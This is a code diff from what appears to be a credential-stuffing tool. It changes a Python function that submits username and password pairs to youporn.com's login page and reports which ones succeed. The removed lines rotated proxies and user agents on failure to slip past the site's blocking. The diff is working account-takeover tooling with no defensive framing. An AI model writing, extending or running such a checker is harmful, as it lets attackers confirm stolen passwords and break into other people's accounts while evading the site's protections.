@@ -1,27 +1,21 @@
-from logging import debug
+import requests
 
-from catchEmAll.proxyrequests.proxy_requests import ProxyRequest
+from catchEmAll.pokedex.pokeball import Pokeball
 
 
-def youporn(usr: str, pwd: str, mr: ProxyRequest):
+def youporn(poke: Pokeball):
+    usr, pwd = poke.get_account()
     post_url = "https://www.youporn.com/login/"
     # Post request to login
-    res = mr.post_with_checks(post_url,
-                              data={'login[username]': usr,
-                                    'login[password]': pwd,
-                                    'login[previous]': '',
-                                    'login[logical_data': '{}',
-                                    })
-    mr.clear_cookies()
-    if res:
-        # TODO has some false positive
-        if "Bad credentials" in str(res.text):
-            return False
-        else:
-            print(res.content)
-            return True
+    res = poke.requests_function(requests.post, post_url,
+                                 data={'login[username]': usr,
+                                       'login[password]': pwd,
+                                       'login[previous]': '',
+                                       'login[logical_data': '{}',
+                                       })
+    # mr.clear_cookies()
+    # TODO has some false positive
+    if "Bad credentials" in str(res.text):
+        return False
     else:
-        debug("Youporn problem")
-        mr.set_random_proxy()
-        mr._set_random_user_agent()
-        return youporn(usr, pwd, mr)
+        return True
